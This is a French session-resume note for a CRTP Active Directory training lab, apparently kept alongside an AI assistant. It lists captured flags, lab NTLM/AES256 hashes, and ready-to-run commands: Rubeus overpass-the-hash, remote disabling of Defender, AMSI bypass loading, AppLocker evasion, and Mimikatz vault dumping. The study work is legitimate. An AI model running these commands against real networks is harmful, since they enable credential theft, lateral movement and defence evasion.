---
type: session-state
statut: en cours
dernière-maj: 2026-07-16
prochain-flag: F12
---

# Reprise · État de session CRTP

> [!summary] But
> Fiche pivot pour **reprendre le lab à froid** après un crash / une compaction / un jour off. État atomique : où on en est, ce qui est en cache, quoi ré-établir avant le prochain flag.

> [!important] Fichiers liés
> - Memory Claude : `crtp_progression_state.md` (état persistant cross-session)
> - Skill : `crtp-companion` → `references/session-resume.md` (procédure de reprise)
> - Prochain flag en cours : [[F12 - Source des creds tâches planifiées]]
> - Learning en cours : [[LO07 - Session DA et escalade]]

## 1. Progression flags (validés)

| Flag | Machine        | Réponse validée                                            | Fiche                                                                 |
| ---- | -------------- | ---------------------------------------------------------- | --------------------------------------------------------------------- |
| F01  | dc             | (voir fiche)                                               | [[F01 - SID membre du groupe Enterprise Admins]]                       |
| F02  | dc             | (voir fiche)                                               | [[F02 - Droits AD de RDPUsers sur ControlxUser]]                       |
| F03  | dc             | (voir fiche)                                               | [[F03 - GPO appliquée sur StudentMachines OU]]                         |
| F04  | dc             | (voir fiche)                                               | [[F04 - Sens du trust dollarcorp - eurocorp]]                          |
| F05  | studentx       | (voir fiche)                                               | [[F05 - Service abusé pour privesc locale]]                            |
| F06  | studentx       | (voir fiche)                                               | [[F06 - Script hunt admin via PS Remoting]]                            |
| F07  | dcorp-ci       | (voir fiche)                                               | [[F07 - User Jenkins console web]]                                     |
| F08  | dcorp-ci       | (voir fiche)                                               | [[F08 - User de domaine du service Jenkins]]                           |
| F09  | dcorp-adminsrv | `gPCFileSysPath`                                           | [[F09 - Attribut Group Policy modifié]]                                |
| F10  | dcorp-mgmt     | `MSSQLSERVER`                                              | [[F10 - Process utilisant svcadmin]]                                   |
| F11  | dcorp-mgmt     | NTLM `b38ff50264b74508085d82c69794a4d8` + AES256 (fiche)   | [[F11 - NTLM de svcadmin]]                                             |

**In progress** : F12 (source creds scheduled tasks — attendu `Credential Manager` / `Credential Vault`).

**Restants LO07** : F13 (srvadmin), F14 (websvc), F15 (appadmin) — un dump LSASS `dcorp-adminsrv` couvre les 3.

## 2. État session technique

### Ce qu'on possède
- **NTLM svcadmin** : `b38ff50264b74508085d82c69794a4d8` (rc4_hmac_nt)
- **AES256 svcadmin** : `6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011`
- **RCE ciadmin** sur `dcorp-ci` (Jenkins web) — admin local dérivé sur `dcorp-mgmt`
- Golden Ticket (obtenu hors intended path, on ne l'utilise plus pour LO07-13)

### Ce qui doit être ré-établi à la reprise
1. **TGT svcadmin DA** en cache student VM :
   ```powershell
   $a = [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("C:\AD\Tools\Rubeus.exe"))
   $a.EntryPoint.Invoke($null, @(,[string[]]@("asktgt","/user:svcadmin","/aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011","/ptt")))
   klist   # confirmer TGT krbtgt/DOLLARCORP pour svcadmin
   ```
2. **Defender** coupé sur dcorp-adminsrv (au moment du dump LSASS) :
   ```powershell
   Invoke-Command -ComputerName dcorp-adminsrv -ScriptBlock { Set-MpPreference -DisableRealtimeMonitoring $true }
   ```
3. **Amsi-Byp** à recharger avant tout dot-source Invoke-Mimi :
   ```powershell
   iex (Get-Content C:\AD\Tools\Amsi-Byp.txt -Raw)
   ```

### Sessions actives (à vérifier)
```powershell
Get-PSSession   # nettoyer si stale : Get-PSSession | Remove-PSSession
klist           # TGT DA présent ?
whoami /all     # session courante ?
```

## 3. Pièges déjà rencontrés (à ne pas retomber dedans)

| Piège | Fix rapide | Fiche |
|-------|-----------|-------|
| AppLocker CLM sur `dcorp-adminsrv` (OU `Applocked`) | Dot-source depuis `C:\Windows\Tasks\` (whitelisté) | [[Cheatsheet - Lateral movement]] |
| `Copy-Item -ToSession` bloqué en CLM | Push SMB UNC : `\\dcorp-adminsrv...\C$\Windows\Tasks\` | idem |
| Student VM FW inbound bloqué | Exfil via Jenkins `userContent` (outbound seul) | [[Cheatsheet - Post-exploitation]] |
| CRTP réponse hors-standard (F09 = `gPCFileSysPath`, pas `gPCMachineExtensionNames`) | Toujours consulter `[!failure]-` dans fiche flag | [[F09 - Attribut Group Policy modifié]] |
| `Invoke-Command -FilePath` sans `-Session` = runspace jetable | Toujours `New-PSSession` d'abord | [[Cheatsheet - Lateral movement]] |
| PSSession en `Closed state` | `Get-PSSession | Remove-PSSession ; New-PSSession fresh` | idem |
| GPOddity callback muet | Ne pas s'obstiner — utiliser `SharpGPOAbuse` (100% LDAP/SMB sortant) | [[F09 - Attribut Group Policy modifié]] |

## 4. Prochaine action (F12)

Cf recette dans la fiche [[F12 - Source des creds tâches planifiées]] :
1. OPtH svcadmin (cf §2 ci-dessus)
2. `New-PSSession dcorp-adminsrv` + `Get-ScheduledTask` non-SYSTEM (CLM OK)
3. `vaultcmd /list` + `cmdkey /list` dans la PSSession (CLM OK)
4. Réponse = nom du store (`Credential Manager` ou `Credential Vault`)
5. Bonus: dot-source Invoke-Mimi depuis `C:\Windows\Tasks\` pour `vault::cred /patch` → clair srvadmin pour F13

## 5. Discipline de mise à jour (rappel)

> [!danger] Après chaque validation flag ou piège, cycle obligatoire
> 1. Résoudre technique
> 2. Valider flag CRTP web
> 3. `Edit` la fiche flag (Réponse + `[!failure]-`)
> 4. `Edit` le LO parent (chaîne d'exploitation)
> 5. `Edit` la cheatsheet impactée si nouveau pattern
> 6. **Update cette fiche `Reprise - État session.md`** (table + prochain flag)
> 7. Répondre à l'utilisateur

Voir feedback memory `feedback_vault_updates.md`.

## Refs
- [[Journal - Index]]
- [[Flags - Index]]
- [[LO07 - Session DA et escalade]]
- [[Cheatsheet - Lateral movement]]
- [[Cheatsheet - Post-exploitation]]

[[Journal - Index]] · [[Flags - Index]]
